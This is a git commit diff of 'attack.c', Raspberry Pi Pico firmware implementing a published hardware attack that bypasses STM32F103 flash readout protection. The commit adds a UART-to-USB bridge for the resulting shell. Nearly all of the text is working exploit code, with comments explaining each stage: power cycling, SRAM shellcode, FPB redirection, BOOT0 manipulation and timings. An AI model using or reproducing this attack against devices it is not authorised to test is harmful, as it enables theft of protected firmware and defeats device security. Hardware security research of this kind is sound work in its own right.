ca815ed7e7f03d12c405560ce8d4f44472c04a76
CTXz <ctx.xda@gmail.com>
2023-06-13 16:25:08 +0200

    Implemented UART bridge
    Signed-off-by: CTXz <ctx.xda@gmail.com>

--- attack.c
+++ attack.c
@@ -13,17 +13,19 @@
 
  * You should have received a copy of the GNU General Public License
  * along with this program.  If not, see <https://www.gnu.org/licenses/>.
- * 
+ *
  * This attack is based on the work of the works of:
  *  Johannes Obermaier, Marc Schink and Kosma Moczek
  * The relevant paper can be found here, particularly section H3:
  *  https://www.usenix.org/system/files/woot20-paper-obermaier.pdf
  * And the relevant code can be found here:
  *  https://github.com/JohannesObermaier/f103-analysis/tree/master/h3
- * 
+ *
  */
 
-#include "pico/stdlib.h"
+#include <stdio.h>
+#include <pico/stdlib.h>
+#include <hardware/uart.h>
 
 // Exact steps for attack:
 //  Power pin high
@@ -31,7 +33,7 @@
 //  Power pin low
 //  Wait for reset to go low <- GPIO INPUT
 //  Power pin high
-//  Wait for SRAM firmware to run (Approx 14.5ms) 
+//  Wait for SRAM firmware to run (Approx 14.5ms)
 //  Set boot0 pin and reset pin to low
 //  Wait for reset release (Approx 14.5ms)
 //  Set reset to input
@@ -39,83 +41,110 @@
 
 #define LED_PIN     PICO_DEFAULT_LED_PIN
 
-#define POWER_PIN_1 2
+#define POWER_PIN   2
 #define RESET_PIN   4
 #define BOOT0_PIN   5
 
+#define UART_TX_PIN 0
+#define UART_RX_PIN 1
+#define UART_BAUD   9600
+#define UART_ID     uart0
+#define DATA_BITS   8
+#define STOP_BITS   1
+#define PARITY      UART_PARITY_NONE
+
 #define BTN_PIN     24
 
-int main() {
-    gpio_init(LED_PIN);
-    gpio_init(POWER_PIN_1);
-    gpio_init(RESET_PIN);
-    gpio_init(BOOT0_PIN);
-    gpio_init(BTN_PIN);
-    
-    while (true) {
+int main()
+{
+	stdio_init_all();
 
-        gpio_set_dir(LED_PIN, GPIO_OUT);
-        gpio_set_dir(POWER_PIN_1, GPIO_OUT);
-        gpio_set_dir(BOOT0_PIN, GPIO_OUT);
-        gpio_set_dir(RESET_PIN, GPIO_IN);
-        gpio_set_dir(BTN_PIN, GPIO_IN);
-        gpio_pull_up(BTN_PIN);
+	// Init UART
+	uart_init(UART_ID, UART_BAUD);
+	gpio_set_function(UART_TX_PIN, GPIO_FUNC_UART);
+	gpio_set_function(UART_RX_PIN, GPIO_FUNC_UART);
+	uart_set_format(UART_ID, DATA_BITS, STOP_BITS, PARITY);
+	uart_set_fifo_enabled(UART_ID, true);
 
-        // Enable power and prepare BOOT0
-        gpio_put(POWER_PIN_1, 1);
-        gpio_put(BOOT0_PIN, 1); // Will be necessary later, might as well set it now
-        gpio_put(LED_PIN, 0);
+	gpio_init(LED_PIN);
+	gpio_init(POWER_PIN);
+	gpio_init(RESET_PIN);
+	gpio_init(BOOT0_PIN);
+	gpio_init(BTN_PIN);
 
-        // Wait for GPIOs to settle
-        sleep_ms(500);
+	gpio_set_dir(LED_PIN, GPIO_OUT);
+	gpio_set_dir(POWER_PIN, GPIO_OUT);
+	gpio_set_dir(BOOT0_PIN, GPIO_OUT);
+	gpio_set_dir(RESET_PIN, GPIO_IN);
+	gpio_set_dir(BTN_PIN, GPIO_IN);
+	gpio_pull_up(BTN_PIN);
 
-        // -- Ensure that the shell-code has been loaded into the DUT's SRAM before preceeding --
+	// Enable power and prepare BOOT0
+	gpio_put(POWER_PIN, 1);
+	gpio_put(BOOT0_PIN, 1); // Will be necessary later, might as well set it now
+	gpio_put(LED_PIN, 0);
 
-        // Wait for attack button press
-        while(gpio_get(BTN_PIN)) {
-            tight_loop_contents();
-        }
+	// Wait for GPIOs to settle
+	sleep_ms(500);
 
-        // Drop the power
-        gpio_put(LED_PIN, 1);
-        gpio_put(POWER_PIN_1, 0);
+	// -- Ensure that the shell-code has been loaded into the DUT's SRAM before preceeding --
 
-        // Wait for reset to go low
-        while(gpio_get(RESET_PIN)) {
-            tight_loop_contents();
-        }
+	// Wait for attack button press
+	while(gpio_get(BTN_PIN)) {
+		tight_loop_contents();
+	}
 
-        // Immediately re-enable power
-        gpio_put(POWER_PIN_1, 1);
+	// Drop the power
+	gpio_put(LED_PIN, 1);
+	gpio_put(POWER_PIN, 0);
 
+	// Wait for reset to go low
+	while(gpio_get(RESET_PIN)) {
+		tight_loop_contents();
+	}
 
-        // Debugger lock is now disabled and we're now
-        // booting from SRAM. Wait for the DUT to run stage 1
-        // of the exploit which sets the FPB to jump to stage 2
-        // when the PC reaches a reset vector fetch (0x00000004)
-        sleep_ms(15);
+	// Immediately re-enable power
+	gpio_put(POWER_PIN, 1);
 
-        // Set BOOT0 to boot from flash. This will trick the DUT
-        // into thinking it's running from flash, which will
-        // disable readout protection.
-        gpio_put(BOOT0_PIN, 0);
+	// Debugger lock is now disabled and we're now
+	// booting from SRAM. Wait for the DUT to run stage 1
+	// of the exploit which sets the FPB to jump to stage 2
+	// when the PC reaches a reset vector fetch (0x00000004)
+	sleep_ms(15);
 
-        // Reset the DUT
-        gpio_set_dir(RESET_PIN, GPIO_OUT);
-        gpio_put(RESET_PIN, 0);
+	// Set BOOT0 to boot from flash. This will trick the DUT
+	// into thinking it's running from flash, which will
+	// disable readout protection.
+	gpio_put(BOOT0_PIN, 0);
 
-        // Wait for reset
-        sleep_ms(15);
+	// Reset the DUT
+	gpio_set_dir(RESET_PIN, GPIO_OUT);
+	gpio_put(RESET_PIN, 0);
 
-        // Release reset
-        // Due to the FPB, the DUT will now jump to
-        // stage 2 of the exploit, which will output a shell
-        // over UART with readout protection disabled.
-        gpio_set_dir(RESET_PIN, GPIO_IN);
+	// Wait for reset
+	sleep_ms(15);
 
-        // Wait for the DUT to run stage 2
-        sleep_ms(218);
+	// Release reset
+	// Due to the FPB, the DUT will now jump to
+	// stage 2 of the exploit, which will output a shell
+	// over UART with readout protection disabled.
+	gpio_set_dir(RESET_PIN, GPIO_IN);
 
-        gpio_put(LED_PIN, 0);
-    }
+	printf("%c", uart_getc(UART_ID)); // Wait for root shell to print out
+	gpio_put(LED_PIN, 0);
+
+	// Forward UART to USB
+	while (true) {
+		// Forward UART to USB
+		if (uart_is_readable(UART_ID)) {
+			char data = uart_getc(UART_ID);
+			printf("%c", data);
+		}
+
+		// Forward USB to UART
+		char c = getchar_timeout_us(0);
+		if (c != (char)PICO_ERROR_TIMEOUT) {
+			uart_putc(UART_ID, c);
+		}
+	}
 }
